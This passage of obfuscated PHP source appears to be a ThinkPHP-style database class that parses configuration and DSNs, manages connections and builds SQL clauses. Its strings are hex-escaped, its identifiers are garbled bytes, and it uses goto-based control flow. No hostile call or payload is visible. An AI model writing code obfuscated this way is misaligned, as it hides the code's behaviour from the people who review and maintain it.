protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\x65\161" => "\74\x3e", "\147\x74" => "\x3e", "\x65\x67\164" => "\76\x3d", "\x6c\164" => "\74", "\x65\154\164" => "\74\x3d", "\156\x6f\164\154\151\153\x65" => "\116\x4f\x54\40\x4c\111\113\x45", "\x6c\151\x6b\x65" => "\114\x49\x4b\105", "\x69\156" => "\111\x4e", "\x6e\x6f\x74\151\x6e" => "\116\x4f\124\x20\x49\116", "\x6e\x6f\164\x20\x69\x6e" => "\x4e\x4f\124\x20\x49\x4e", "\x62\145\x74\167\x65\x65\156" => "\x42\x45\124\x57\x45\105\x4e", "\x6e\x6f\164\142\145\164\167\x65\x65\156" => "\x4e\117\x54\x20\x42\x45\x54\127\x45\x45\x4e", "\x6e\x6f\164\40\x62\x65\x74\x77\145\x65\x6e" => "\116\117\124\x20\x42\105\124\x57\105\105\x4e"); protected $selectSql = "\x53\x45\x4c\x45\x43\124\45\104\111\x53\x54\111\116\x43\124\45\40\x25\106\x49\105\x4c\x44\45\40\x46\122\117\115\x20\x25\x54\x41\102\114\x45\x25\45\112\117\111\x4e\x25\45\x57\110\105\122\x45\x25\x25\107\x52\x4f\x55\120\x25\45\x48\101\126\111\x4e\107\45\x25\117\x52\x44\105\122\45\x25\114\111\x4d\111\124\45\40\x25\125\x4e\x49\x4f\116\x25\45\x43\117\115\115\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $D¿ğ»÷ºñ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¹…ÕÄ][898], $D¿ğ»÷ºñ); } public function factory($E‹å‰ù÷‚´ = '') { goto cµï–ÑŸ²; F“ø±’¹™Æ: return $bØ‚›¡¹¶Â; goto c ¡·™Äé; c«ö×Ê„’›: $this->dbType = ucwords(strtolower($E‹å‰ù÷‚´[$fÉÔÀ‰õ©[899]])); $b™‹¢Âáî‰ = $fÉÔÀ‰õ©[901] . $this->dbType; if (class_exists($b™‹¢Âáî‰)) { $bØ‚›¡¹¶Â = new $b™‹¢Âáî‰($E‹å‰ù÷‚´); if ($fÉÔÀ‰õ©[741] != strtolower($E‹å‰ù÷‚´[$fÉÔÀ‰õ©[899]])) { $bØ‚›¡¹¶Â->dbType = strtoupper($this->dbType); } else { $bØ‚›¡¹¶Â->dbType = $this->_getDsnType($E‹å‰ù÷‚´[$fÉÔÀ‰õ©[854]]); } } else { think_exception(think_lang($fÉÔÀ‰õ©[902]) . $fÉÔÀ‰õ©[903] . $b™‹¢Âáî‰); } goto F“ø±’¹™Æ; cµï–ÑŸ²: $fÉÔÀ‰õ© =& $_SERVER[¹…ÕÄ]; $E‹å‰ù÷‚´ = $this->parseConfig($E‹å‰ù÷‚´); if (empty($E‹å‰ù÷‚´[$fÉÔÀ‰õ©[899]])) { think_exception(think_lang($fÉÔÀ‰õ©[900])); } goto c«ö×Ê„’›; c ¡·™Äé: } public function __call($Eè÷øÒô‚É, $Fèä†…«¿) { if (method_exists($this, $Eè÷øÒô‚É)) { return call_user_func_array(array($this, $Eè÷øÒô‚É), $Fèä†…«¿); } } protected function _getDsnType($AÔ…ÊïĞØ•) { $b¸ó™Õ¶¥ˆ = explode($_SERVER[¹…ÕÄ][4], $AÔ…ÊïĞØ•); $Cò˜¶«à = strtoupper(trim($b¸ó™Õ¶¥ˆ[0])); return $Cò˜¶«à; } private function parseConfig($c®ğ‡Î° = '') { $cÁƒï¾÷š =& $_SERVER[¹…ÕÄ]; if (!empty($c®ğ‡Î°) && is_string($c®ğ‡Î°)) { $c®ğ‡Î° = $this->parseDSN($c®ğ‡Î°); } elseif (is_array($c®ğ‡Î°)) { $c®ğ‡Î° = array_change_key_case($c®ğ‡Î°); $c®ğ‡Î° = array($cÁƒï¾÷š[899] => $c®ğ‡Î°[$cÁƒï¾÷š[740]], $cÁƒï¾÷š[827] => $c®ğ‡Î°[$cÁƒï¾÷š[904]], $cÁƒï¾÷š[828] => $c®ğ‡Î°[$cÁƒï¾÷š[905]], $cÁƒï¾÷š[825] => $c®ğ‡Î°[$cÁƒï¾÷š[906]], $cÁƒï¾÷š[826] => $c®ğ‡Î°[$cÁƒï¾÷š[907]], $cÁƒï¾÷š[17] => $c®ğ‡Î°[$cÁƒï¾÷š[908]], $cÁƒï¾÷š[854] => $c®ğ‡Î°[$cÁƒï¾÷š[742]], $cÁƒï¾÷š[13] => isset($c®ğ‡Î°[$cÁƒï¾÷š[909]]) ? $c®ğ‡Î°[$cÁƒï¾÷š[909]] : array()); } elseif (empty($c®ğ‡Î°)) { if (think_config($cÁƒï¾÷š[910]) && $cÁƒï¾÷š[741] != strtolower(think_config($cÁƒï¾÷š[911]))) { $c®ğ‡Î° = $this->parseDSN(think_config($cÁƒï¾÷š[910])); } else { $c®ğ‡Î° = array($cÁƒï¾÷š[899] => think_config($cÁƒï¾÷š[911]), $cÁƒï¾÷š[827] => think_config($cÁƒï¾÷š[912]), $cÁƒï¾÷š[828] => think_config($cÁƒï¾÷š[913]), $cÁƒï¾÷š[825] => think_config($cÁƒï¾÷š[914]), $cÁƒï¾÷š[826] => think_config($cÁƒï¾÷š[915]), $cÁƒï¾÷š[17] => think_config($cÁƒï¾÷š[242]), $cÁƒï¾÷š[854] => think_config($cÁƒï¾÷š[910]), $cÁƒï¾÷š[13] => think_config($cÁƒï¾÷š[916])); } } return $c®ğ‡Î°; } protected function initConnect($cä°íĞôÓ• = true) { if (1 == think_config($_SERVER[¹…ÕÄ][18])) { $this->_linkID = $this->multiConnect($cä°íĞôÓ•); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $EÉ§ÈÕ¨Ê => $cî…¾ÊÄÒá) { $this->_linkID = $cî…¾ÊÄÒá; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($BµÂ‘»î™… = false) { $fÁ‚Õ„ÁÅ =& $_SERVER[¹…ÕÄ]; static $eÆ™²ï¹ì = array(); if (empty($eÆ™²ï¹ì)) { foreach ($this->config as $dªË³ÊñÄÁ => $d‚Ã×½áôè) { $eÆ™²ï¹ì[$dªË³ÊñÄÁ] = explode($fÁ‚Õ„ÁÅ[47], $d‚Ã×½áôè); } } if (think_config($fÁ‚Õ„ÁÅ[917])) { if ($BµÂ‘»î™…) { $EàÄ†›½¸ = floor(mt_rand(0, think_config($fÁ‚Õ„ÁÅ[918]) - 1)); } else { if (is_numeric(think_config($fÁ‚Õ„ÁÅ[919]))) { $EàÄ†›½¸ = think_config($fÁ‚Õ„ÁÅ[919]); } else { $EàÄ†›½¸ = floor(mt_rand(think_config($fÁ‚Õ„ÁÅ[918]), count($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[825]]) - 1)); } } } else { $EàÄ†›½¸ = floor(mt_rand(0, count($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[825]]) - 1)); } $c‘ªô©òÎ = array($fÁ‚Õ„ÁÅ[827] => isset($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[827]][$EàÄ†›½¸]) ? $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[827]][$EàÄ†›½¸] : $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[827]][0], $fÁ‚Õ„ÁÅ[828] => isset($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[828]][$EàÄ†›½¸]) ? $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[828]][$EàÄ†›½¸] : $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[828]][0], $fÁ‚Õ„ÁÅ[825] => isset($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[825]][$EàÄ†›½¸]) ? $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[825]][$EàÄ†›½¸] : $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[825]][0], $fÁ‚Õ„ÁÅ[826] => isset($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[826]][$EàÄ†›½¸]) ? $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[826]][$EàÄ†›½¸] : $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[826]][0], $fÁ‚Õ„ÁÅ[17] => isset($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[17]][$EàÄ†›½¸]) ? $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[17]][$EàÄ†›½¸] : $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[17]][0], $fÁ‚Õ„ÁÅ[854] => isset($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[854]][$EàÄ†›½¸]) ? $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[854]][$EàÄ†›½¸] : $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[854]][0], $fÁ‚Õ„ÁÅ[13] => isset($eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[13]][$EàÄ†›½¸]) ? $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[13]][$EàÄ†›½¸] : $eÆ™²ï¹ì[$fÁ‚Õ„ÁÅ[13]][0]); return $this->connect($c‘ªô©òÎ, $EàÄ†›½¸); } public function parseDSN($AŠ¡Í‹¬ó¹) { $d˜é×Ô—Æ‘ =& $_SERVER[¹…ÕÄ]; if (empty($AŠ¡Í‹¬ó¹)) { return !1; } $FğæÃŒÎçí = parse_url($AŠ¡Í‹¬ó¹); if ($FğæÃŒÎçí[$d˜é×Ô—Æ‘[174]]) { $cÎ÷ñ¯š›æ = array($d˜é×Ô—Æ‘[899] => $FğæÃŒÎçí[$d˜é×Ô—Æ‘[174]], $d˜é×Ô—Æ‘[827] => isset($FğæÃŒÎçí[$d˜é×Ô—Æ‘[557]]) ? $FğæÃŒÎçí[$d˜é×Ô—Æ‘[557]] : $d˜é×Ô—Æ‘[33], $d˜é×Ô—Æ‘[828] => isset($FğæÃŒÎçí[$d˜é×Ô—Æ‘[920]]) ? $FğæÃŒÎçí[$d˜é×Ô—Æ‘[920]] : $d˜é×Ô—Æ‘[33], $d˜é×Ô—Æ‘[825] => isset($FğæÃŒÎçí[$d˜é×Ô—Æ‘[175]]) ? $FğæÃŒÎçí[$d˜é×Ô—Æ‘[175]] : $d˜é×Ô—Æ‘[33], $d˜é×Ô—Æ‘[826] => isset($FğæÃŒÎçí[$d˜é×Ô—Æ‘[176]]) ? $FğæÃŒÎçí[$d˜é×Ô—Æ‘[176]] : $d˜é×Ô—Æ‘[33], $d˜é×Ô—Æ‘[17] => isset($FğæÃŒÎçí[$d˜é×Ô—Æ‘[75]]) ? substr($FğæÃŒÎçí[$d˜é×Ô—Æ‘[75]], 1) : $d˜é×Ô—Æ‘[33]); } else { preg_match($d˜é×Ô—Æ‘[921], trim($AŠ¡Í‹¬ó¹), $eÍ”ˆÅ„Á); $cÎ÷ñ¯š›æ = array($d˜é×Ô—Æ‘[899] => $eÍ”ˆÅ„Á[1], $d˜é×Ô—Æ‘[827] => $eÍ”ˆÅ„Á[2], $d˜é×Ô—Æ‘[828] => $eÍ”ˆÅ„Á[3], $d˜é×Ô—Æ‘[825] => $eÍ”ˆÅ„Á[4], $d˜é×Ô—Æ‘[826] => $eÍ”ˆÅ„Á[5], $d˜é×Ô—Æ‘[17] => $eÍ”ˆÅ„Á[6]); } $cÎ÷ñ¯š›æ[$d˜é×Ô—Æ‘[854]] = $d˜é×Ô—Æ‘[33]; return $cÎ÷ñ¯š›æ; } protected function debug() { $c“ÌÂáõ„« =& $_SERVER[¹…ÕÄ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $c“ÌÂáõ„«[922]; if (think_config($c“ÌÂáõ„«[923])) { think_status($c“ÌÂáõ„«[924]); think_trace($this->queryStr . $c“ÌÂáõ„«[925] . think_status($c“ÌÂáõ„«[20], $c“ÌÂáõ„«[924], 6) . $c“ÌÂáõ„«[926], $c“ÌÂáõ„«[33], $c“ÌÂáõ„«[927]); } } protected function parseLock($f¥ÆƒÉ­ø× = false) { $c²Äò±†ÀÊ =& $_SERVER[¹…ÕÄ]; if (!$f¥ÆƒÉ­ø×) { return $c²Äò±†ÀÊ[33]; } if ($c²Äò±†ÀÊ[856] == $this->dbType) { return $c²Äò±†ÀÊ[928]; } return $c²Äò±†ÀÊ[929]; } protected function parseSet($fÏ˜¾ŸÚ‰) { $DÉÑ‚ëè£” =& $_SERVER[¹…ÕÄ]; foreach ($fÏ˜¾ŸÚ‰ as $dÆ£†»¿…Ø => $Aåõ“‡ìÂÁ) { if (is_array($Aåõ“‡ìÂÁ) && $DÉÑ‚ëè£”[293] == $Aåõ“‡ìÂÁ[0]) { $dÕ‹çÀ©‡¢[] = $this->parseKey($dÆ£†»¿…Ø) . $DÉÑ‚ëè£”[930] . $Aåõ“‡ìÂÁ[1]; } elseif (is_scalar($Aåõ“‡ìÂÁ) || is_null($Aåõ“‡ìÂÁ)) { $dÕ‹çÀ©‡¢[] = $this->parseKey($dÆ£†»¿…Ø) . $DÉÑ‚ëè£”[930] . $this->parseValue($Aåõ“‡ìÂÁ); } } return $DÉÑ‚ëè£”[931] . implode($DÉÑ‚ëè£”[47], $dÕ‹çÀ©‡¢); } protected function bindParam($aÄóê¹“–†, $B¥³ÉßÀ¹â) { $this->bind[$_SERVER[¹…ÕÄ][4] . $aÄóê¹“–†] = $B¥³ÉßÀ¹â; } protected function parseBind($c¶Œ„áÅ¹) { $c¶Œ„áÅ¹ = array_merge($this->bind, $c¶Œ„áÅ¹); $this->bind = array(); return $c¶Œ„áÅ¹; } function parseKey(&$e„¹¨…È§, $DÁøİˆ¿›… = true) { if ($DÁøİˆ¿›…) { $e„¹¨…È§ = $this->parseKeyCheck($e„¹¨…È§); } return $e„¹¨…È§; } function parseKeyCheck($dÖò÷¥«ùĞ) { $C¢îëŸÃœ =& $_SERVER[¹…ÕÄ]; $dÖò÷¥«ùĞ = trim($dÖò÷¥«ùĞ); if (!preg_match($C¢îëŸÃœ[932], $dÖò÷¥«ùĞ)) { think_exception($C¢îëŸÃœ[933] . $dÖò÷¥«ùĞ); } return $dÖò÷¥«ùĞ; } protected function parseValue($CåïÏË»ó) { $F—•µä¾Ò¦ =& $_SERVER[¹…ÕÄ]; if (is_string($CåïÏË»ó)) { $CåïÏË»ó = $F—•µä¾Ò¦[895] . $this->escapeString($CåïÏË»ó) . $F—•µä¾Ò¦[895]; } elseif (isset($CåïÏË»ó[0]) && is_string($CåïÏË»ó[0]) && strtolower($CåïÏË»ó[0]) == $F—•µä¾Ò¦[293]) { $CåïÏË»ó = $this->escapeString($CåïÏË»ó[1]); } elseif (is_array($CåïÏË»ó)) { $CåïÏË»ó = array_map(array($this, $F—•µä¾Ò¦[896]), $CåïÏË»ó); } elseif (is_bool($CåïÏË»ó)) { $CåïÏË»ó = $CåïÏË»ó ? $F—•µä¾Ò¦[86] : $F—•µä¾Ò¦[491]; } elseif (is_null($CåïÏË»ó)) { $CåïÏË»ó = $F—•µä¾Ò¦[102]; } return $CåïÏË»ó; } protected function parseField($aÃ…Ææ‰Ñº) { $aÎŞá…›èÒ =& $_SERVER[¹…ÕÄ]; if (is_string($aÃ…Ææ‰Ñº) && strpos($aÃ…Ææ‰Ñº, $aÎŞá…›èÒ[47])) { $aÃ…Ææ‰Ñº = explode($aÎŞá…›èÒ[47], $aÃ…Ææ‰Ñº); } if (is_array($aÃ…Ææ‰Ñº)) { $bäí¨ò“¤´ = array(); foreach ($aÃ…Ææ‰Ñº as $b÷ã®Ú‹ë => $bæ›µ—âö„) { if (!is_numeric($b÷ã®Ú‹ë)) { $bäí¨ò“¤´[] = $this->parseKey($b÷ã®Ú‹ë, !1) . $aÎŞá…›èÒ[934] . $this->parseKey($bæ›µ—âö„); } else { $bäí¨ò“¤´[] = $this->parseKey($bæ›µ—âö„); } } $E¨½ê·›¢ = implode($aÎŞá…›èÒ[47], $bäí¨ò“¤´); } elseif (is_string($aÃ…Ææ‰Ñº) && !empty($aÃ…Ææ‰Ñº)) { $E¨½ê·›¢ = $aÃ…Ææ‰Ñº; } else { $E¨½ê·›¢ = $aÎŞá…›èÒ[182]; } return $E¨½ê·›¢; } protected function parseTable($b³¿†ƒ‰Á‡) { $báŸÎïŒª¨ =& $_SERVER[¹…ÕÄ]; if (is_array($b³¿†ƒ‰Á‡)) { $B©Î³¼¯´µ = array(); foreach ($b³¿†ƒ‰Á‡ as $Dæ›â…²½ß => $c«­İ½± ) { if (!is_numeric($Dæ›â…²½ß)) { $B©Î³¼¯´µ[] = $this->parseKey($Dæ›â…²½ß) . $báŸÎïŒª¨[50] . $this->parseKey($c«­İ½± ); } else { $B©Î³¼¯´µ[] = $this->parseKey($Dæ›â…²½ß); } } $b³¿†ƒ‰Á‡ = $B©Î³¼¯´µ; } elseif (is_string($b³¿†ƒ‰Á‡)) { if (strstr($b³¿†ƒ‰Á‡, $báŸÎïŒª¨[50])) { return $b³¿†ƒ‰Á‡; } $b³¿†ƒ‰Á‡ = explode($báŸÎïŒª¨[47], $b³¿†ƒ‰Á‡); array_walk($b³¿†ƒ‰Á‡, array($this, $báŸÎïŒª¨[845])); } return $báŸÎïŒª¨[839] . trim(implode($báŸÎïŒª¨[935], $b³¿†ƒ‰Á‡), $báŸÎïŒª¨[380]) . $báŸÎïŒª¨[839]; } protected function parseWhere($f¦÷›²ñÀ¿) { $E·Ê‘Ê²ë¹ =& $_SERVER[¹…ÕÄ]; $dƒïä¡Úï = $E·Ê‘Ê²ë¹[33]; if (is_string($f¦÷›²ñÀ¿)) { $dƒïä¡Úï = $f¦÷›²ñÀ¿; } else { $DÈé¯ë´õµ = isset($f¦÷›²ñÀ¿[$E·Ê‘Ê²ë¹[936]]) ? strtoupper($f¦÷›²ñÀ¿[$E·Ê‘Ê²ë¹[936]]) : $E·Ê‘Ê²ë¹[33]; if (in_array($DÈé¯ë´õµ, array($E·Ê‘Ê²ë¹[937], $E·Ê‘Ê²ë¹[938], $E·Ê‘Ê²ë¹[939]))) { $DÈé¯ë´õµ = $E·Ê‘Ê²ë¹[50] . $DÈé¯ë´õµ . $E·Ê‘Ê²ë¹[50]; unset($f¦÷›²ñÀ¿[$E·Ê‘Ê²ë¹[936]]); } else { $DÈé¯ë´õµ = $E·Ê‘Ê²ë¹[940]; } foreach ($f¦÷›²ñÀ¿ as $d¢š—ˆ µŒ => $Aªäó¬„¬¿) { $dƒïä¡Úï .= $E·Ê‘Ê²ë¹[273]; if (is_numeric($d¢š—ˆ µŒ)) { $d¢š—ˆ µŒ = $E·Ê‘Ê²ë¹[941]; } if (0 === strpos($d¢š—ˆ µŒ, $E·Ê‘Ê²ë¹[70])) { $dƒïä¡Úï .= $this->parseThinkWhere($d¢š—ˆ µŒ, $Aªäó¬„¬¿); } else { if (!preg_match($E·Ê‘Ê²ë¹[942], trim($d¢š—ˆ µŒ))) { think_exception(think_lang($E·Ê‘Ê²ë¹[943]) . $E·Ê‘Ê²ë¹[4] . $d¢š—ˆ µŒ); } $AõÖ¶Şš‚’ = is_array($Aªäó¬„¬¿) && isset($Aªäó¬„¬¿[$E·Ê‘Ê²ë¹[944]]); $d¢š—ˆ µŒ = trim($d¢š—ˆ µŒ); if (strpos($d¢š—ˆ µŒ, $E·Ê‘Ê²ë¹[279])) { $dÛë½„öñ‹ = explode($E·Ê‘Ê²ë¹[279], $d¢š—ˆ µŒ); $DÛåÖ‡ƒÚ = array(); foreach ($dÛë½„öñ‹ as $e‹Ş‰íÇÛ† => $D±‡¡Èµò) { $EÚé±“ğÀã = $AõÖ¶Şš‚’ ? $Aªäó¬„¬¿[$e‹Ş‰íÇÛ†] : $Aªäó¬„¬¿; $DÛåÖ‡ƒÚ[] = $E·Ê‘Ê²ë¹[256] . $this->parseWhereItem($this->parseKey($D±‡¡Èµò), $EÚé±“ğÀã) . $E·Ê‘Ê²ë¹[844]; } $dƒïä¡Úï .= implode($E·Ê‘Ê²ë¹[945], $DÛåÖ‡ƒÚ); } elseif (strpos($d¢š—ˆ µŒ, $E·Ê‘Ê²ë¹[280])) { $dÛë½„öñ‹ = explode($E·Ê‘Ê²ë¹[280], $d¢š—ˆ µŒ); $DÛåÖ‡ƒÚ = array(); foreach ($dÛë½„öñ‹ as $e‹Ş‰íÇÛ† => $D±‡¡Èµò) { $EÚé±“ğÀã = $AõÖ¶Şš‚’ ? $Aªäó¬„¬¿[$e‹Ş‰íÇÛ†] : $Aªäó¬„¬¿; $DÛåÖ‡ƒÚ[] = $E·Ê‘Ê²ë¹[256] . $this->parseWhereItem($this->parseKey($D±‡¡Èµò), $EÚé±“ğÀã) . $E·Ê‘Ê²ë¹[844]; } $dƒïä¡Úï .= implode($E·Ê‘Ê²ë¹[940], $DÛåÖ‡ƒÚ); } else { $dƒïä¡Úï .= $this->parseWhereItem($this->parseKey($d¢š—ˆ µŒ), $Aªäó¬„¬¿); } } $dƒïä¡Úï .= $E·Ê‘Ê²ë¹[274] . $DÈé¯ë´õµ; } $dƒïä¡Úï = substr($dƒïä¡Úï, 0, -strlen($DÈé¯ë´õµ)); } return empty($dƒïä¡Úï) ? $E·Ê‘Ê²ë¹[33] : $E·Ê‘Ê²ë¹[946] . $dƒïä¡Úï; } protected function parseWhereItem($FãŠ‰ñè¼, $F‚£—Îäğè) { $eì®³‡œÄã =& $_SERVER[¹…ÕÄ]; $d†šÄ÷‹‚ = $eì®³‡œÄã[33]; if (is_array($F‚£—Îäğè)) { if (is_string($F‚£—Îäğè[0])) { $e„âíªµÚ¥ = strtolower($F‚£—Îäğè[0]); if (in_array($F‚£—Îäğè[0], array($eì®³‡œÄã[930], $eì®³‡œÄã[947], $eì®³‡œÄã[948], $eì®³‡œÄã[949], $eì®³‡œÄã[950], $eì®³‡œÄã[951]))) { $d†šÄ÷‹‚ .= $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $F‚£—Îäğè[0] . $eì®³‡œÄã[50] . $this->parseValue($F‚£—Îäğè[1]); } elseif (preg_match($eì®³‡œÄã[952], $F‚£—Îäğè[0])) { $d†šÄ÷‹‚ .= $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $this->exp[$e„âíªµÚ¥] . $eì®³‡œÄã[50] . $this->parseValue($F‚£—Îäğè[1]); } elseif (preg_match($eì®³‡œÄã[953], $F‚£—Îäğè[0])) { if (is_array($F‚£—Îäğè[1])) { $F“¤É«Ø‰ = isset($F‚£—Îäğè[2]) ? strtoupper($F‚£—Îäğè[2]) : $eì®³‡œÄã[938]; if (in_array($F“¤É«Ø‰, array($eì®³‡œÄã[937], $eì®³‡œÄã[938], $eì®³‡œÄã[939]))) { $a·ˆ³«¦ = array(); foreach ($F‚£—Îäğè[1] as $E“°½ò®½) { $a·ˆ³«¦[] = $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $this->exp[$e„âíªµÚ¥] . $eì®³‡œÄã[50] . $this->parseValue($E“°½ò®½); } $d†šÄ÷‹‚ .= $eì®³‡œÄã[256] . implode($eì®³‡œÄã[50] . $F“¤É«Ø‰ . $eì®³‡œÄã[50], $a·ˆ³«¦) . $eì®³‡œÄã[844]; } } else { $d†šÄ÷‹‚ .= $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $this->exp[$e„âíªµÚ¥] . $eì®³‡œÄã[50] . $this->parseValue($F‚£—Îäğè[1]); } } elseif ($eì®³‡œÄã[293] == $e„âíªµÚ¥) { $d†šÄ÷‹‚ .= $eì®³‡œÄã[842] . $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $F‚£—Îäğè[1] . $eì®³‡œÄã[954]; } elseif (preg_match($eì®³‡œÄã[955], $F‚£—Îäğè[0])) { $d†šÄ÷‹‚ .= $F‚£—Îäğè[0]; } elseif (preg_match($eì®³‡œÄã[956], $F‚£—Îäğè[0])) { if (isset($F‚£—Îäğè[2]) && $eì®³‡œÄã[293] == $F‚£—Îäğè[2]) { $d†šÄ÷‹‚ .= $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $this->exp[$e„âíªµÚ¥] . $eì®³‡œÄã[50] . $F‚£—Îäğè[1]; } else { if (is_string($F‚£—Îäğè[1])) { $F‚£—Îäğè[1] = explode($eì®³‡œÄã[47], $F‚£—Îäğè[1]); } $a¸÷ó¿Ğõ¾ = implode($eì®³‡œÄã[47], $this->parseValue($F‚£—Îäğè[1])); $d†šÄ÷‹‚ .= $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $this->exp[$e„âíªµÚ¥] . $eì®³‡œÄã[842] . $a¸÷ó¿Ğõ¾ . $eì®³‡œÄã[844]; } } elseif (preg_match($eì®³‡œÄã[957], $F‚£—Îäğè[0])) { $CÖĞÙÕéƒ… = is_string($F‚£—Îäğè[1]) ? explode($eì®³‡œÄã[47], $F‚£—Îäğè[1]) : $F‚£—Îäğè[1]; $d†šÄ÷‹‚ .= $eì®³‡œÄã[842] . $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $this->exp[$e„âíªµÚ¥] . $eì®³‡œÄã[50] . $this->parseValue($CÖĞÙÕéƒ…[0]) . $eì®³‡œÄã[940] . $this->parseValue($CÖĞÙÕéƒ…[1]) . $eì®³‡œÄã[274]; } else { think_exception(think_lang($eì®³‡œÄã[943]) . $eì®³‡œÄã[4] . $F‚£—Îäğè[0]); } } else { $D“ÂÇ¡ÎË = count($F‚£—Îäğè); $B¯¡¢†ËªŞ = $eì®³‡œÄã[33]; if (is_string($F‚£—Îäğè[$D“ÂÇ¡ÎË - 1])) { $B¯¡¢†ËªŞ = isset($F‚£—Îäğè[$D“ÂÇ¡ÎË - 1]) ? strtoupper($F‚£—Îäğè[$D“ÂÇ¡ÎË - 1]) : $eì®³‡œÄã[33]; if (in_array($B¯¡¢†ËªŞ, array($eì®³‡œÄã[937], $eì®³‡œÄã[938], $eì®³‡œÄã[939]))) { $D“ÂÇ¡ÎË = $D“ÂÇ¡ÎË - 1; } } else { $B¯¡¢†ËªŞ = $eì®³‡œÄã[937]; } for ($dË´ÚôœµÇ = 0; $dË´ÚôœµÇ < $D“ÂÇ¡ÎË; $dË´ÚôœµÇ++) { $CÖĞÙÕéƒ… = is_array($F‚£—Îäğè[$dË´ÚôœµÇ]) ? $F‚£—Îäğè[$dË´ÚôœµÇ][1] : $F‚£—Îäğè[$dË´ÚôœµÇ]; if ($eì®³‡œÄã[293] == strtolower($F‚£—Îäğè[$dË´ÚôœµÇ][0])) { $d†šÄ÷‹‚ .= $eì®³‡œÄã[256] . $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $CÖĞÙÕéƒ… . $eì®³‡œÄã[954] . $B¯¡¢†ËªŞ . $eì®³‡œÄã[50]; } else { $bãÜõ“âÖ = is_array($F‚£—Îäğè[$dË´ÚôœµÇ]) ? $this->exp[strtolower($F‚£—Îäğè[$dË´ÚôœµÇ][0])] : $eì®³‡œÄã[930]; if (!$bãÜõ“âÖ && is_array($F‚£—Îäğè[$dË´ÚôœµÇ]) && in_array($F‚£—Îäğè[$dË´ÚôœµÇ][0], array($eì®³‡œÄã[930], $eì®³‡œÄã[947], $eì®³‡œÄã[948], $eì®³‡œÄã[949], $eì®³‡œÄã[950], $eì®³‡œÄã[951]))) { $bãÜõ“âÖ = $F‚£—Îäğè[$dË´ÚôœµÇ][0]; } $d†šÄ÷‹‚ .= $eì®³‡œÄã[256] . $FãŠ‰ñè¼ . $eì®³‡œÄã[50] . $bãÜõ“âÖ . $eì®³‡œÄã[50] . $this->parseValue($CÖĞÙÕéƒ…) . $eì®³‡œÄã[954] . $B¯¡¢†ËªŞ . $eì®³‡œÄã[50]; } } $d†šÄ÷‹‚ = substr($d†šÄ÷‹‚, 0, -4); } } else { $d†šÄ÷‹‚ .= $FãŠ‰ñè¼ . $eì®³‡œÄã[958] . $this->parseValue($F‚£—Îäğè); } return $d†šÄ÷‹‚; } protected function parseThinkWhere($aÙ„ôÇï»Ñ, $EŒï§ó†‡—) { $D¹ Õ¤©çï =& $_SERVER[¹…ÕÄ]; $BéÙŒ—¦  = $D¹ Õ¤©çï[33]; switch ($aÙ„ôÇï»Ñ) { case $D¹ Õ¤©çï[348]: $BéÙŒ—¦  = $EŒï§ó†‡—; break; case $D¹ Õ¤©çï[941]: $BéÙŒ—¦  = is_string($EŒï§ó†‡—) ? $EŒï§ó†‡— : substr($this->parseWhere($EŒï§ó†‡—), 6); break; case $D¹ Õ¤©çï[959]: parse_str($EŒï§ó†‡—, $d‡´›‹ãÃÏ); if (isset($d‡´›‹ãÃÏ[$D¹ Õ¤©çï[936]])) { $FëÑíùèÄÒ = $D¹ Õ¤©çï[50] . strtoupper($d‡´›‹ãÃÏ[$D¹ Õ¤©çï[936]]) . $D¹ Õ¤©çï[50]; unset($d‡´›‹ãÃÏ[$D¹ Õ¤©çï[936]]); } else { $FëÑíùèÄÒ = $D¹ Õ¤©çï[940]; } $Bê¾˜Í´ÛÑ = array(); foreach ($d‡´›‹ãÃÏ as $a¾äŸ÷Š™ => $eÌÆáöÔ·) { $Bê¾˜Í´ÛÑ[] = $this->parseKey($a¾äŸ÷Š™) . $D¹ Õ¤©çï[958] . $this->parseValue($eÌÆáöÔ·); } $BéÙŒ—¦  = implode($FëÑíùèÄÒ, $Bê¾˜Í´ÛÑ); break; } return $BéÙŒ—¦ ; } protected function parseLimit($FÆ‘™£²) { $cÒàñŠ¥ó =& $_SERVER[¹…ÕÄ]; return !empty($FÆ‘™£²) ? $cÒàñŠ¥ó[48] . $FÆ‘™£² . $cÒàñŠ¥ó[50] : $cÒàñŠ¥ó[33]; } protected function parseJoin($EÕ¯ÚÆğÃº) { $fÑ®ë½¬Ó¡ =& 